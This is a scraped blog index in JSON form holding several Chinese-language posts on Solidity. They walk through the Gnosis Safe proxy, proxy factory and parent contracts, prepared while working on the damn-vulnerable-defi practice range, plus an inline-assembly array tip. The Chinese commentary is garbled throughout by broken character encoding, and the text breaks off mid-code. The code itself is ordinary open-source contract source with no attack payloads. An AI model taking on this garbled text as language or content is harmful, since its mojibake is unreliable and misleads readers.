è¿è¡Œç»“æœ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸè°ƒç”¨äº†increateå‡½æ•°ã€‚ æ­¤æ”¶è·æ¥è‡ª damn defi backdoorã€‚","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"proxy","slug":"Basic-Knowledge/proxy","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/proxy/"}],"tags":[{"name":"Proxy","slug":"Proxy","permalink":"https://biyouqiuqiu.com/tags/Proxy/"}]},{"title":"è§£è¯»GnosisSafe_es","slug":"DEFI/gnosis/è§£è¯»GnosisSafe_proxies","date":"2023-07-24T07:47:10.000Z","updated":"2023-07-24T07:47:10.000Z","comments":true,"path":"2023/07/24/DEFI/gnosis/è§£è¯»GnosisSafe_proxies/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/24/DEFI/gnosis/%E8%A7%A3%E8%AF%BBGnosisSafe_proxies/","excerpt":"","text":"å‰è¨€ æœ€è¿‘åœ¨åš damn defi é¶åœºçš„æ—¶å€™ï¼Œé‡åˆ°äº†ä¸€äº›é¢˜æ¶‰åŠåˆ° GnosisSafeProxy ç›¸å…³çŸ¥è¯†çš„é¢˜ã€‚æŸ¥ç¼ºè¡¥æ¼ï¼Œå…ˆæ¥å­¦ä¹ å­¦ä¹  GnosisSafeProxy åˆçº¦ã€‚ è§£è¯»GnosisSafeProxy.solè¿™æ˜¯ä¸€ä¸ªä»£ç†åˆçº¦ï¼Œä¸€ä¸ªæ„é€ å™¨ä¸€ä¸ªå›è°ƒå‡½æ•°ã€‚ 1. æºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title IProxy - Helper interface to access masterCopy of the Proxy on-chain/// @author Richard Meissner - &lt;richard@gnosis.io&gt;interface IProxy &#123; function masterCopy() external view returns (address);&#125;/// @title GnosisSafeProxy - Generic proxy contract allows to execute all transactions applying the code of a master contract./// @author Stefan George - &lt;stefan@gnosis.io&gt;/// @author Richard Meissner - &lt;richard@gnosis.io&gt;contract GnosisSafeProxy &#123; // singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated. // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt` address internal singleton; // ä¸ºäº†é˜²æ­¢æ’æ§½å†²çª /// @dev Constructor function sets address of singleton contract. /// @param _singleton Singleton address. constructor(address _singleton) &#123; require(_singleton != address(0), &quot;Invalid singleton address provided&quot;); singleton = _singleton; // åˆå§‹åŒ–singleton &#125; /// @dev Fallback function forwards all transactions and returns all received return data. fallback() external payable &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff) // 0xa619486e == keccak(&quot;masterCopy()&quot;). The value is right padded to 32-bytes with 0s if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) &#123; mstore(0, _singleton) return(0, 0x20) &#125; calldatacopy(0, 0, calldatasize()) let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) if eq(success, 0) &#123; revert(0, returndatasize()) &#125; return(0, returndatasize()) &#125; &#125;&#125; 2. è§£è¯»å›è°ƒå‡½æ•°ï¼Œæœ¬è´¨ä¸Šæ˜¯å…¶ä»–çš„ä»£ç†åˆçº¦å·®ä¸å¤šï¼Œé‡‡ç”¨äº†å†…è”æ±‡ç¼–çš„ delegatecall æ“ä½œç ï¼Œè°ƒç”¨çš„æ˜¯ singletonåˆçº¦çš„å‡½æ•°ï¼Œæ•ˆæœä½œç”¨åœ¨ä»£ç†åˆçº¦ä¸Šã€‚ä¹‹å‰å·²ç»å¯¹ä»£ç†åˆçº¦æœ‰è¿‡ä¸€å®šçš„ å­¦ä¹  ã€‚ è§£è¯»IProxyCreationCallback.sol1. æºç 12345678910111213// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;./GnosisSafeProxy.sol&quot;;interface IProxyCreationCallback &#123; function proxyCreated( GnosisSafeProxy proxy, address _singleton, bytes calldata initializer, uint256 saltNonce ) external;&#125; 2. è§£è¯»æä¾›äº†ä¸€ä¸ªç”¨äºåˆ›å»ºä»£ç†åˆçº¦çš„å‡½æ•°ã€‚ è§£è¯»GnosisSafeProxyFactory.solè¯¥å‡½æ•°ç»§æ‰¿äº† 12import &quot;./GnosisSafeProxy.sol&quot;;import &quot;./IProxyCreationCallback.sol&quot;; 1. æºç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;./GnosisSafeProxy.sol&quot;;import &quot;./IProxyCreationCallback.sol&quot;;/// @title Proxy Factory - Allows to create new proxy contact and execute a message call to the new proxy within one transaction./// @author Stefan George - &lt;stefan@gnosis.pm&gt;contract GnosisSafeProxyFactory &#123; event ProxyCreation(GnosisSafeProxy proxy, address singleton); /// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction. /// @param singleton Address of singleton contract. /// @param data Payload for message call sent to new proxy contract. function createProxy(address singleton, bytes memory data) public returns (GnosisSafeProxy proxy) &#123; proxy = new GnosisSafeProxy(singleton); // åˆ›å»ºä»£ç†åˆçº¦ if (data.length &gt; 0) // solhint-disable-next-line no-inline-assembly assembly &#123; if eq(call(gas(), proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) &#123; revert(0, 0) &#125; &#125; emit ProxyCreation(proxy, singleton); &#125; /// @dev Allows to retrieve the runtime code of a deployed Proxy. This can be used to check that the expected Proxy was deployed. function proxyRuntimeCode() public pure returns (bytes memory) &#123; return type(GnosisSafeProxy).runtimeCode; &#125; /// @dev Allows to retrieve the creation code used for the Proxy deployment. With this it is easily possible to calculate predicted address. function proxyCreationCode() public pure returns (bytes memory) &#123; return type(GnosisSafeProxy).creationCode; &#125; /// @dev Allows to create new proxy contact using CREATE2 but it doesn&#x27;t run the initializer. /// This method is only meant as an utility to be called from other methods /// @param _singleton Address of singleton contract. /// @param initializer Payload for message call sent to new proxy contract. /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract. function deployProxyWithNonce( address _singleton, bytes memory initializer, uint256 saltNonce ) internal returns (GnosisSafeProxy proxy) &#123; // If the initializer changes the proxy address should change too. Hashing the initializer data is cheaper than just concatinating it bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce)); bytes memory deploymentData = abi.encodePacked(type(GnosisSafeProxy).creationCode, uint256(uint160(_singleton))); // solhint-disable-next-line no-inline-assembly assembly &#123; proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt) &#125; require(address(proxy) != address(0), &quot;Create2 call failed&quot;); &#125; /// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction. /// @param _singleton Address of singleton contract. /// @param initializer Payload for message call sent to new proxy contract. /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract. function createProxyWithNonce( address _singleton, bytes memory initializer, uint256 saltNonce ) public returns (GnosisSafeProxy proxy) &#123; proxy = deployProxyWithNonce(_singleton, initializer, saltNonce); if (initializer.length &gt; 0) // solhint-disable-next-line no-inline-assembly assembly &#123; if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) &#123; revert(0, 0) &#125; &#125; emit ProxyCreation(proxy, _singleton); &#125; /// @dev Allows to create new proxy contact, execute a message call to the new proxy and call a specified callback within one transaction /// @param _singleton Address of singleton contract. /// @param initializer Payload for message call sent to new proxy contract. /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract. /// @param callback Callback that will be invoced after the new proxy contract has been successfully deployed and initialized. function createProxyWithCallback( address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback ) public returns (GnosisSafeProxy proxy) &#123; uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback))); proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback); if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce); &#125; /// @dev Allows to get the address for a new proxy contact created via `createProxyWithNonce` /// This method is only meant for address calculation purpose when you use an initializer that would revert, /// therefore the response is returned with a revert. When calling this method set `from` to the address of the proxy factory. /// @param _singleton Address of singleton contract. /// @param initializer Payload for message call sent to new proxy contract. /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract. function calculateCreateProxyWithNonceAddress( address _singleton, bytes calldata initializer, uint256 saltNonce ) external returns (GnosisSafeProxy proxy) &#123; proxy = deployProxyWithNonce(_singleton, initializer, saltNonce); revert(string(abi.encodePacked(proxy))); &#125;&#125; 2. è§£è¯»createProxyå‡½æ•° å…¶ä½œç”¨æ˜¯åˆ›å»ºä¸€ä¸ªä»£ç†åˆçº¦å¯¹è±¡ï¼Œå¯ä»¥æ‰§è¡Œä¸€æ¬¡å§”æ‰˜è°ƒç”¨ã€‚ proxyRuntimeCodeå‡½æ•° AIè§£è¯»ï¼š type(GnosisSafeProxy) è¿”å›çš„æ˜¯ä¸€ä¸ªåŒ…å«åˆçº¦ç±»å‹ä¿¡æ¯çš„å¯¹è±¡ï¼Œå®ƒå¯ä»¥ç”¨äºè®¿é—®åˆçº¦çš„å„ç§å±æ€§å’Œæ–¹æ³•ã€‚åœ¨è¿™ä¸ªä»£ç ç‰‡æ®µä¸­ï¼Œä½¿ç”¨äº† type(GnosisSafeProxy).runtimeCode æ¥è·å– GnosisSafeProxy åˆçº¦çš„è¿è¡Œæ—¶å­—èŠ‚ç ã€‚ è¿è¡Œæ—¶å­—èŠ‚ç æ˜¯ Solidity åˆçº¦ç¼–è¯‘åçš„å­—èŠ‚ç ï¼Œå®ƒåŒ…å«äº†åˆçº¦çš„ä»£ç å’Œæ•°æ®ï¼Œå¹¶ä¸”å·²ç»ç»è¿‡äº†ç¼–è¯‘å™¨å’Œä¼˜åŒ–å™¨çš„å¤„ç†ï¼Œå¯ä»¥ç›´æ¥åœ¨ä»¥å¤ªåŠè™šæ‹Ÿæœºï¼ˆEVMï¼‰ä¸Šæ‰§è¡Œã€‚ä¸æºä»£ç ä¸åŒï¼Œè¿è¡Œæ—¶å­—èŠ‚ç æ˜¯æ— æ³•è¿›è¡Œä¿®æ”¹çš„ï¼Œå› æ­¤å¯ä»¥ç”¨äºè¿›è¡Œåˆçº¦éªŒè¯å’Œå®‰å…¨å®¡è®¡ã€‚ åœ¨è¿™ä¸ªä»£ç ç‰‡æ®µä¸­ï¼Œtype(GnosisSafeProxy).runtimeCode è¿”å›çš„æ˜¯ GnosisSafeProxy åˆçº¦çš„è¿è¡Œæ—¶å­—èŠ‚ç ã€‚è¿™ä¸ªè¿è¡Œæ—¶å­—èŠ‚ç å¯ä»¥ç”¨äºç”Ÿæˆä»£ç†åˆçº¦çš„ bytecodeï¼Œä»è€Œåˆ›å»ºæ–°çš„ GnosisSafe å¤šç­¾é’±åŒ…åˆçº¦å®ä¾‹ã€‚å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ªè¿è¡Œæ—¶å­—èŠ‚ç åŒ…å«äº†åˆçº¦çš„ä»£ç å’Œæ•°æ®ï¼Œä»¥åŠåˆçº¦çš„åœ°å€ç­‰å…ƒä¿¡æ¯ï¼Œå¯ä»¥ç”¨äºéƒ¨ç½²åˆçº¦å’Œæ‰§è¡Œåˆçº¦æ“ä½œã€‚ proxyCreationCodeå‡½æ•° è¿”å› GnosisSafeProxy çš„ Bytecodeã€‚ deployProxyWithNonceå‡½æ•° ä½¿ç”¨create2çš„æ–¹å¼ç”Ÿæˆä¸€ä¸ªGnosisSafeProxyåˆçº¦åœ°å€ã€‚ createProxyWithNonceå‡½æ•° è°ƒç”¨ deployProxyWithNonce å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„ä»£ç†åˆçº¦åœ°å€ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æ‰§è¡Œä¸€æ¬¡å§”æ‰˜è°ƒç”¨ã€‚ createProxyWithCallbackå‡½æ•° æ ¹æ® callbacké‡‡ç”¨create2çš„æ–¹å¼è®¡ç®—å‡ºä»£ç†åˆçº¦åœ°å€ calculateCreateProxyWithNonceAddresså‡½æ•° æ ¹æ® saltNonceé‡‡ç”¨create2çš„æ–¹å¼è®¡ç®—å‡ºä»£ç†åˆçº¦åœ°å€ã€‚ æœ€åï¼Œä½œè€…æ°´å¹³æœ‰é™ï¼Œæœ‰é”™è¯·å¤§ä½¬ä»¬åŠæ—¶æŒ‡å‡ºğŸ˜","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"gnosis","slug":"DEFI/gnosis","permalink":"https://biyouqiuqiu.com/categories/DEFI/gnosis/"}],"tags":[{"name":"gnosis","slug":"gnosis","permalink":"https://biyouqiuqiu.com/tags/gnosis/"},{"name":"proxiy","slug":"proxiy","permalink":"https://biyouqiuqiu.com/tags/proxiy/"}]},{"title":"è§£å†³æ•°ç»„å†…å­˜æµªè´¹","slug":"Experience/tips/è§£å†³æ•°ç»„å†…å­˜æµªè´¹","date":"2023-07-23T07:47:10.000Z","updated":"2023-07-23T07:47:10.000Z","comments":true,"path":"2023/07/23/Experience/tips/è§£å†³æ•°ç»„å†…å­˜æµªè´¹/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/23/Experience/tips/%E8%A7%A3%E5%86%B3%E6%95%B0%E7%BB%84%E5%86%85%E5%AD%98%E6%B5%AA%E8%B4%B9/","excerpt":"","text":"å‰è¨€å½“æˆ‘ä»¬æƒ³ç”¨æ•°ç»„å­˜å‚¨ä¸€äº›æ•°æ®çš„æ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬ä¸çŸ¥é“æ•°æ®çš„ä¸ªæ•°æœ‰å¤šå°‘çš„è¯ï¼Œå¾€å¾€ä¼šå¼€è¾Ÿä¸€ä¸ªé•¿åº¦å¾ˆå¤§çš„æ•°ç»„ï¼Œå¦‚æœæ•°æ®çš„ä¸ªæ•°å¾ˆå°‘ï¼Œé‚£ä¹ˆå‡½æ•°ç»™æˆ‘ä»¬è¿”å›çš„æ•°ç»„å°±ä¼šæœ‰å¾ˆå¤šæœªä½¿ç”¨çš„ç©ºé—´ï¼Œè¿™æ ·ä¸€æ¥å°±ä¼šé€ æˆç©ºé—´æµªè´¹ï¼Œæ¶ˆè€—æ›´å¤šçš„gasï¼Œè€Œåœ¨åŒºå—é“¾ä¸Šgasä¹Ÿæ˜¯é’±å‘ï¼Œæˆ‘ä»¬æœ¬ç€èƒ½çœå°±çœçš„ç†å¿µã€‚ æ‰€ä»¥æœ€å¥½èƒ½å¿½ç•¥æ‰é‚£äº›æœªä½¿ç”¨çš„ç©ºé—´ã€‚ ä½¿ç”¨å†…è”æ±‡ç¼–å¯ä»¥å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ æ–¹æ³•123456789101112131415function setOwners() external pure returns (uint256 length, address[] memory temp) &#123; temp = new address[](6); uint ownerCount = 3; for (uint i; i &lt; 3; i++) &#123; temp[i] = address(0); &#125; assembly &#123; mstore(temp, ownerCount) length := mload(temp) &#125;&#125; ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å…ˆå¼€è¾Ÿäº†ä¸€ä¸ªé•¿åº¦ä¸º6çš„æ•°ç»„ç©ºé—´ï¼Œè€Œå®é™…åªæ“ä½œäº†ä¸‰ä¸ªç©ºé—´ï¼Œæˆ‘ä»¬éœ€è¦è¿”å›æ•°ç»„çš„å‰ä¸‰ä¸ªå…ƒç´ å³å¯ã€‚ æ•ˆæœæ¼”ç¤º","categories":[{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/categories/Experience/"},{"name":"tips","slug":"Experience/tips","permalink":"https://biyouqiuqiu.com/categories/Experience/tips/"}],"tags":[{"name":"å†…è”æ±‡ç¼–","slug":"å†…è”æ±‡ç¼–","permalink":"https://biyouqiuqiu.com/tags/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"}]},{"title":"è§£è¯»GnosisSafe","slug":"DEFI/gnosis/GnosisSafeè§£è¯»","date":"2023-07-23T05:47:10.000Z","updated":"2023-07-23T05:47:10.000Z","comments":true,"path":"2023/07/23/DEFI/gnosis/GnosisSafeè§£è¯»/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/23/DEFI/gnosis/GnosisSafe%E8%A7%A3%E8%AF%BB/","excerpt":"","text":"å‰è¨€ æœ€è¿‘åœ¨åš damn defi é¶åœºçš„æ—¶å€™ï¼Œé‡åˆ°äº†ä¸€äº›é¢˜æ¶‰åŠåˆ° GnosisSafe ç›¸å…³çŸ¥è¯†çš„é¢˜ã€‚æŸ¥ç¼ºè¡¥æ¼ï¼Œå…ˆæ¥å­¦ä¹ å­¦ä¹  GnosisSafe åˆçº¦ã€‚ è§£è¯» GnosisSafeçš„çˆ¶åˆçº¦123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;./base/ModuleManager.sol&quot;;import &quot;./base/OwnerManager.sol&quot;;import &quot;./base/FallbackManager.sol&quot;;import &quot;./base/GuardManager.sol&quot;;import &quot;./common/EtherPaymentFallback.sol&quot;;import &quot;./common/Singleton.sol&quot;;import &quot;./common/SignatureDecoder.sol&quot;;import &quot;./common/SecuredTokenTransfer.sol&quot;;import &quot;./common/StorageAccessible.sol&quot;;import &quot;./interfaces/ISignatureValidator.sol&quot;;import &quot;./external/GnosisSafeMath.sol&quot;;/// @title Gnosis Safe - A multisignature wallet with support for confirmations using signed messages based on ERC191./// @author Stefan George - &lt;stefan@gnosis.io&gt;/// @author Richard Meissner - &lt;richard@gnosis.io&gt;contract GnosisSafe is EtherPaymentFallback, Singleton, ModuleManager, OwnerManager, SignatureDecoder, SecuredTokenTransfer, ISignatureValidatorConstants, FallbackManager, StorageAccessible, GuardManager&#123; é¦–å…ˆä¸éš¾çœ‹å‡ºï¼Œè¯¥åˆçº¦ç»§æ‰¿äº†ä¸€å¤§å †åˆçº¦ï¼Œæ²¡åŠæ³•åªèƒ½å…ˆæŠŠä»–çš„ä¸€ç³»åˆ—çˆ¶åˆçº¦çœ‹å®Œã€‚ 1. EtherPaymentFallback.sol12345678910111213141516// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title EtherPaymentFallback - A contract that has a fallback to accept ether payments/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract EtherPaymentFallback &#123; // æ¥æ”¶åˆ°ETHæ—¶è§¦å‘ event SafeReceived(address indexed sender, uint256 value); /// @dev Fallback function accepts Ether transactions. // å›è°ƒå‡½æ•°ï¼Œç”¨äºæ¥æ”¶ETH receive() external payable &#123; emit SafeReceived(msg.sender, msg.value); &#125;&#125; è¯¥åˆçº¦æ¯”è¾ƒç®€å•ï¼Œåªæœ‰ä¸€ä¸ªç”¨äºæ¥æ”¶ETHçš„å›è°ƒå‡½æ•°ï¼Œç»§æ‰¿è¯¥åˆçº¦åï¼Œå­ç±»å¯ä»¥æ¥æ”¶å…¶ä»–åˆçº¦è½¬å‘çš„ETHã€‚ 2. Singleton.sol123456789101112// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title Singleton - Base for singleton contracts (should always be first super contract)/// This contract is tightly coupled to our proxy contract (see `proxies/GnosisSafeProxy.sol`)/// @author Richard Meissner - &lt;richard@gnosis.io&gt;contract Singleton &#123; // singleton always needs to be first declared variable, to ensure that it is at the same location as in the Proxy contract. // It should also always be ensured that the address is stored alone (uses a full word) address private singleton;&#125; è¯¥åˆçº¦å°±åªæœ‰ä¸€ä¸ªå…¨å±€ç§æœ‰çš„åœ°å€å˜é‡ã€‚å®ƒæ˜¯ç”¨äºåœ¨ä»£ç†æ¨¡å¼ä¸­ç¡®ä¿ä¸é€»è¾‘åˆçº¦ä¸­çš„å˜é‡ä½ç½®ä¿æŒä¸€è‡´ã€‚ 3. ModuleManager.solè¯¥åˆçº¦åˆç»§æ‰¿äº†ä¸¤ä¸ªåˆçº¦ï¼Œå…ˆçœ‹ä»–çš„ä¸¤ä¸ªçˆ¶åˆçº¦ã€‚ 3.1 SelfAuthorized.sol12345678910111213141516171819// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title SelfAuthorized - authorizes current contract to perform actions/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract SelfAuthorized &#123; // æ‰§è¡Œåˆ¤æ–­è¯­å¥ï¼Œè§„å®šè°ƒç”¨è€…åœ°å€ é¡»ä¸º æœ¬åˆçº¦åœ°å€ function requireSelfCall() private view &#123; require(msg.sender == address(this), &quot;GS031&quot;); &#125; // ä¿®é¥°å™¨ï¼Œè°ƒç”¨ requireSelfCall å‡½æ•°ï¼Œè¢«è¯¥ä¿®é¥°å™¨ä¿®é¥°çš„å‡½æ•°çš„è°ƒç”¨è€…é¡»ä¸ºè¯¥åˆçº¦æ‰å¯ä»¥è°ƒç”¨ modifier authorized() &#123; // This is a function call as it minimized the bytecode size requireSelfCall(); _; &#125;&#125; è¯¥åˆçº¦ä¸»è¦æ˜¯æä¾›äº†ä¸€ä¸ªä¿®é¥°å™¨ï¼Œç”¨äºé™åˆ¶æŸäº›å‡½æ•°çš„è°ƒç”¨è€…èº«ä»½å¿…é¡»ä¸ºæœ¬åˆçº¦æ‰è¡Œã€‚ 3.2 Executor.solè¯¥åˆçº¦ç»§æ‰¿äº† Enum.sol , å…ˆçœ‹ Enum.sol 3.2.1 Enum.sol12345678910// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title Enum - Collection of enums/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract Enum &#123; // è¿™æ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹çš„ï¼Œå®šä¹‰äº†ä¸¤ç§æ“ä½œç±»å‹ call å’Œ delegatecall enum Operation &#123;Call, DelegateCall&#125;&#125; è¿™ä¸ªæšä¸¾ç±»å‹å®šä¹‰äº†ä¸¤ä¸ªæ“ä½œç±»å‹ï¼Œåˆ†åˆ«æ˜¯ Call å’Œ DelegateCallã€‚å®ƒä»¬åˆ†åˆ«è¡¨ç¤ºä¸åŒçš„æ™ºèƒ½åˆçº¦è°ƒç”¨æ–¹å¼ï¼š Callï¼šè¡¨ç¤ºé€šè¿‡åˆçº¦åœ°å€ç›´æ¥è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°ã€‚åœ¨è¿™ç§è°ƒç”¨æ–¹å¼ä¸‹ï¼Œè°ƒç”¨è€…çš„ä¸Šä¸‹æ–‡ï¼ˆä¾‹å¦‚åˆçº¦åœ°å€å’Œå‘é€è€…åœ°å€ï¼‰ä¼šè¢«ä¿ç•™ã€‚ DelegateCallï¼šè¡¨ç¤ºé€šè¿‡åˆçº¦åœ°å€å§”æ‰˜è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°ã€‚åœ¨è¿™ç§è°ƒç”¨æ–¹å¼ä¸‹ï¼Œè°ƒç”¨è€…çš„ä¸Šä¸‹æ–‡ä¼šè¢«ä¼ é€’ç»™è¢«è°ƒç”¨çš„åˆçº¦ï¼Œä»¥ä¾¿è¯¥åˆçº¦å¯ä»¥è®¿é—®è°ƒç”¨è€…çš„çŠ¶æ€å’Œæƒé™ã€‚ è¿™ä¸ªæšä¸¾ç±»å‹å¸¸ç”¨äºæ™ºèƒ½åˆçº¦ä¸­çš„å¤šç­¾åé’±åŒ…ç­‰åœºæ™¯ä¸­ï¼Œä»¥æŒ‡å®šä¸åŒçš„æ“ä½œç±»å‹ã€‚ä¾‹å¦‚ï¼Œå¤šç­¾åé’±åŒ…å¯ä»¥ä½¿ç”¨ Call æ“ä½œæ¥æ‰§è¡Œæ ‡å‡†çš„è½¬è´¦æ“ä½œï¼Œè€Œä½¿ç”¨ DelegateCall æ“ä½œæ¥æ‰§è¡Œå¤æ‚çš„åˆçº¦é€»è¾‘ï¼Œä»¥ç¡®ä¿è°ƒç”¨è€…çš„æƒé™å’ŒçŠ¶æ€å¾—åˆ°ä¿æŠ¤ã€‚ åœ¨ä½¿ç”¨è¿™ä¸ªæšä¸¾ç±»å‹æ—¶ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ¥è®¿é—®æšä¸¾å€¼ï¼š 1Operation op = Operation.Call; å…¶ä¸­ï¼Œop æ˜¯ä¸€ä¸ª Operation ç±»å‹çš„å˜é‡ï¼Œå®ƒå¯ä»¥è¢«èµ‹å€¼ä¸º Call æˆ– DelegateCallã€‚ çœ‹å®Œ Enum.solï¼Œæˆ‘ä»¬åœ¨çœ‹ä¼š Executor.sol 123456789101112131415161718192021222324252627282930pragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;../common/Enum.sol&quot;;/// @title Executor - A contract that can execute transactions/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract Executor &#123; function execute( address to, // ç›®çš„åœ°å€ uint256 value, // msg.value bytes memory data, // æ“ä½œçš„ABIç¼–ç  Enum.Operation operation, // è¿™é‡Œæ˜¯æŒ‡ Enumåˆçº¦ä¸­çš„ä¸¤ç§æ“ä½œæ–¹å¼ï¼Œcall å’Œ delegatecall uint256 txGas // gas ) internal returns (bool success) &#123; // å¦‚æœ operation æ˜¯å§”æ‰˜è°ƒç”¨åˆ™æ‰§è¡Œdelegatecallï¼Œåä¹‹åˆ™æ‰§è¡Œcall if (operation == Enum.Operation.DelegateCall) &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0) &#125; &#125; else &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0) &#125; &#125; &#125;&#125; â€‹ è¯¥å‡½æ•°ä¹ä¸€çœ‹ï¼Œä½¿ç”¨äº†å†…è”æ±‡ç¼–ä¸­çš„ call å’Œ delegatecallï¼Œç”¨äºæ‰§è¡Œäº¤æ˜“ï¼Œæ¯”å¦‚å‡½æ•°çš„è°ƒç”¨ç­‰ã€‚è™½ç„¶ä¸¤ä¸ªå‚æ•°æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯åŸç†æˆªç„¶ä¸åŒï¼Œå¯ä»¥çœ‹æˆ‘å†™çš„ä¸€ç¯‡ æ–‡ç«  ã€‚ æ€»ä¹‹ï¼Œ è¯¥åˆçº¦ç»™æˆ‘ä»¬æä¾›äº†ä¸¤ç§æ‰§è¡Œæ–¹å¼ï¼Œä¸€ç§æ˜¯ç›´æ¥è°ƒç”¨ callå¦ä¸€ç§æ˜¯å§”æ‰˜è°ƒç”¨ delegatecalã€‚ çœ‹å®Œ ModuleManager.solçš„ä¸¤ä¸ªçˆ¶åˆçº¦ï¼Œæˆ‘ä»¬çœ‹å› ModuleManager.solåˆçº¦ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;../common/Enum.sol&quot;;import &quot;../common/SelfAuthorized.sol&quot;;import &quot;./Executor.sol&quot;;/// @title Module Manager - A contract that manages modules that can execute transactions via this contract/// @author Stefan George - &lt;stefan@gnosis.pm&gt;/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract ModuleManager is SelfAuthorized, Executor &#123; event EnabledModule(address module); event DisabledModule(address module); event ExecutionFromModuleSuccess(address indexed module); event ExecutionFromModuleFailure(address indexed module); // address(0x1) = 0x0000000000000000000000000000000000000001 address internal constant SENTINEL_MODULES = address(0x1); mapping(address =&gt; address) internal modules; // è®¾ç½®æ¨¡å— /** è¯¥å‡½æ•°å¯ä»¥ç®€å•ç†è§£ä¸º, ä½¿ç”¨å§”æ‰˜è°ƒç”¨çš„æ–¹å¼ è°ƒç”¨ to ä¸­çš„å‡½æ•° (dataä¸ºå‡½æ•°çš„ABIç¼–ç ) */ function setupModules(address to, bytes memory data) internal &#123; // åˆ¤æ–­ SENTINEL_MODULES æ˜¯å¦è¢«æ‰§è¡Œè¿‡ require(modules[SENTINEL_MODULES] == address(0), &quot;GS100&quot;); // å°† SENTINEL_MODULES æ”¾å…¥æ˜ å°„ä¸­ï¼Œä»£è¡¨æ“ä½œå·²è¢«æ‰§è¡Œï¼Œå°†ä¸èƒ½è°ƒç”¨è¯¥å‡½æ•° modules[SENTINEL_MODULES] = SENTINEL_MODULES; // ç›®çš„åœ°å€ä¸èƒ½æ˜¯ 0 åœ°å€ if (to != address(0)) // Setup has to complete successfully or transaction fails. require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), &quot;GS000&quot;); &#125; /// @dev Allows to add a module to the whitelist. /// This can only be done via a Safe transaction. /// @notice Enables the module `module` for the Safe. /// @param module Module to be whitelisted. function enableModule(address module) public authorized &#123; // Module address cannot be null or sentinel. require(module != address(0) &amp;&amp; module != SENTINEL_MODULES, &quot;GS101&quot;); // Module cannot be added twice. // æœªç»™modules[module]èµ‹å€¼çš„æƒ…å†µä¸‹ï¼Œmodules[module] = address(0) require(modules[module] == 